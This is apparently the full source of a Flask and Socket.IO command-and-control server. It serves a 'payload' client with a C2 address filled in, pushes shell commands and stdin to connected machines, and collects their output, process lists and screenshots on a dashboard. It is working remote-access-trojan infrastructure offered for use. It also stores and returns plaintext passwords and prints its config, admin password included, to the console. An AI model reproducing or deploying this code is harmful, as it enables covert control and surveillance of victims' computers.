import io
import os
import sqlite3
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room
import logging
import threading
import time
import yaml
import re

with open('./config.yml', 'r') as file:
    config = yaml.safe_load(file)

print(config)

# --- Basic Setup ---
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", logger=False, engineio_logger=False, async_mode='threading')
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

DB_PATH = 'clients.db'

# --- In-Memory Cache ---
screenshot_cache = {}
last_seen_cache = {}
connected_clients = {}

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (hostname TEXT PRIMARY KEY, alias TEXT, description TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS macros
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, command TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL
    )''')
    conn.commit()
    # Seed initial user from config if no users exist
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    if count == 0:
        with open('./config.yml', 'r') as f:
            cfg = yaml.safe_load(f)
            username = cfg.get('username', 'admin')
            password = cfg.get('password', 'admin')
            c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
            print(f"[INFO] Initial user '{username}' created. Remove password from config.yml now.")
        conn.commit()
    conn.close()
init_db()

def get_client_metadata(hostname):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT alias, description FROM clients WHERE hostname=?", (hostname,))
    row = c.fetchone()
    conn.close()
    return {'alias': row[0], 'description': row[1]} if row else {'alias': '', 'description': ''}

def save_client_metadata(hostname, alias, description):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO clients (hostname, alias, description) VALUES (?, ?, ?)",
              (hostname, alias, description))
    conn.commit()
    conn.close()

def get_all_known_clients():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT hostname, alias, description FROM clients")
    rows = c.fetchall()
    conn.close()
    return rows

def get_macros():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, name, command FROM macros")
    rows = c.fetchall()
    conn.close()
    return [{'id': r[0], 'name': r[1], 'command': r[2]} for r in rows]

def add_macro(name, command):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO macros (name, command) VALUES (?, ?)", (name, command))
    conn.commit()
    conn.close()

def delete_macro(macro_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM macros WHERE id=?", (macro_id,))
    conn.commit()
    conn.close()

# --- Global State & Constants ---
ADMIN_USERNAME = config["username"]
ADMIN_PASSWORD = config["password"]
DASHBOARD_ROOM = 'dashboards'
DEFAULT_SCREENSHOT_DATA = "R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs="

def get_merged_client_list():
    known = get_all_known_clients()
    live_hostnames = {c['hostname']: sid for sid, c in connected_clients.items()}
    merged = []
    for hostname, alias, description in known:
        is_online = hostname in live_hostnames
        display_img = screenshot_cache.get(hostname, DEFAULT_SCREENSHOT_DATA)
        merged.append({
            'hostname': hostname,
            'alias': alias or hostname,
            'description': description or "No description set.",
            'id': live_hostnames.get(hostname),
            'online': is_online,
            'screenshot_data': display_img
        })
    return merged

# --- Background Threads ---
def periodic_monitor(socketio_instance):
    STALE_TIMEOUT = 30
    while True:
        time.sleep(5)
        with app.app_context():
            now = time.time()
            stale_ids = [sid for sid, data in connected_clients.items()
                         if (now - data.get('last_real_screenshot_time', 0)) > STALE_TIMEOUT]
            for sid in stale_ids:
                connected_clients.pop(sid, None)
                try: socketio_instance.disconnect(sid, namespace='/api')
                except: pass
            try:
                socketio_instance.emit('client_list', get_merged_client_list(), namespace='/api', to=DASHBOARD_ROOM)
            except Exception as e:
                logger.error(f"Periodic update error: {e}")

# --- User Management API ---
@app.route('/api/users', methods=['GET'])
def get_users():
    if not session.get('logged_in') or not session.get('username'):
        return jsonify({'error': 'Unauthorized'}), 401
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT username, password FROM users')
    users = [{'username': row[0], 'password': row[1]} for row in c.fetchall()]
    conn.close()
    return jsonify({'users': users})

@app.route('/api/users', methods=['POST'])
def add_user():
    if not session.get('logged_in') or not session.get('username'):
        return jsonify({'error': 'Unauthorized'}), 401
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'error': 'Missing fields'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
        conn.commit()
    except sqlite3.IntegrityError:
        conn.close()
        return jsonify({'error': 'User already exists'}), 409
    conn.close()
    return jsonify({'success': True})

@app.route('/api/users/<username>', methods=['DELETE'])
def delete_user(username):
    if not session.get('logged_in') or not session.get('username'):
        return jsonify({'error': 'Unauthorized'}), 401
    # Don't let user delete their own session for now
    if username == session.get('username'):
        return jsonify({'error': 'Cannot delete current user'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM users WHERE username=?', (username,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

# --- Routes ---
@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.json
        username = data.get('username')
        password = data.get('password')
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT username FROM users WHERE username = ? AND password = ?', (username, password))
        user = c.fetchone()
        conn.close()
        if user:
            session['logged_in'] = True
            session['username'] = username
            return jsonify(message="Success"), 200
        return jsonify(message='Invalid'), 401
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if session.get('logged_in') and session.get('username'):
        return render_template('dashboard.html')
    return redirect(url_for("login"))

@app.route('/payload')
def payload():
    with open("client.py", "r") as f:
        content = f.read()

    content = re.sub(r'(C2_ADDRESS\s*=\s*).*', f'C2_ADDRESS = "{config["url"]}"', content)
    content = re.sub(r'(TARGET_HEIGHT\s*=\s*).*', f'TARGET_HEIGHT = {config["resolution"]}', content)

    return send_file(io.BytesIO(content.encode()), mimetype='text/x-python', as_attachment=True, download_name='client.py')

# --- Socket Events ---
@socketio.on('join_dashboard', namespace="/api")
def handle_join_dashboard():
    join_room(DASHBOARD_ROOM, sid=request.sid)
    emit('client_list', get_merged_client_list())
    emit('macro_list', get_macros())

@socketio.on('client_info', namespace="/api")
def handle_client_info(data):
    hostname = data.get('hostname', 'Unknown')
    meta = get_client_metadata(hostname)
    if not meta['alias'] and not meta['description']:
        save_client_metadata(hostname, hostname, "")
    connected_clients[request.sid] = {'hostname': hostname, 'last_real_screenshot_time': time.time()}
    socketio.emit('client_list', get_merged_client_list(), namespace='/api', to=DASHBOARD_ROOM)

@socketio.on('update_metadata', namespace="/api")
def handle_update_metadata(data):
    if session.get('logged_in'):
        save_client_metadata(data['hostname'], data['alias'], data['description'])
        socketio.emit('client_list', get_merged_client_list(), namespace='/api', to=DASHBOARD_ROOM)

@socketio.on('add_macro', namespace="/api")
def handle_add_macro(data):
    if session.get('logged_in'):
        add_macro(data['name'], data['command'])
        socketio.emit('macro_list', get_macros(), namespace='/api', to=DASHBOARD_ROOM)

@socketio.on('delete_macro', namespace="/api")
def handle_delete_macro(data):
    if session.get('logged_in'):
        delete_macro(data['id'])
        socketio.emit('macro_list', get_macros(), namespace='/api', to=DASHBOARD_ROOM)

@socketio.on('command', namespace="/api")
def handle_command(data):
    if session.get('logged_in'):
        socketio.emit('execute_command', data.get('command'), to=data.get('client_id'), namespace='/api')

@socketio.on('system_command', namespace="/api")
def handle_system_command(data):
    if session.get('logged_in'):
        socketio.emit('system_command', data.get('command'), to=data.get('client_id'), namespace='/api')

@socketio.on('stdin', namespace="/api")
def handle_stdin(data):
    if session.get('logged_in'):
        socketio.emit('stdin', data.get('command'), to=data.get('client_id'), namespace='/api')

@socketio.on('command_output', namespace="/api")
def handle_command_output(data):
    socketio.emit('command_output', {'output': data.get('output'), 'client_id': request.sid}, namespace='/api', to=DASHBOARD_ROOM)

@socketio.on('system_output', namespace="/api")
def handle_system_output(data):
    socketio.emit('system_output', {'output': data.get('output'), 'client_id': request.sid}, namespace='/api', to=DASHBOARD_ROOM)

@socketio.on('process_list', namespace="/api")
def handle_process_list(data):
    socketio.emit('process_list', {'processes': data.get('processes'), 'client_id': request.sid}, namespace='/api', to=DASHBOARD_ROOM)

@socketio.on('screenshot', namespace="/api")
def handle_screenshot(image_data=None):
    if request.sid in connected_clients and image_data:
        if image_data == DEFAULT_SCREENSHOT_DATA: return
        hostname = connected_clients[request.sid]['hostname']
        screenshot_cache[hostname] = image_data
        connected_clients[request.sid]['last_real_screenshot_time'] = time.time()
        socketio.emit('screenshot_data', {'image_data': image_data, 'client_id': request.sid}, namespace="/api", to=DASHBOARD_ROOM)

if __name__ == '__main__':
    threading.Thread(target=periodic_monitor, args=(socketio,), daemon=True).start()
    socketio.run(app, allow_unsafe_werkzeug=True, debug=False, host='0.0.0.0', port = config["port"], use_reloader=False)
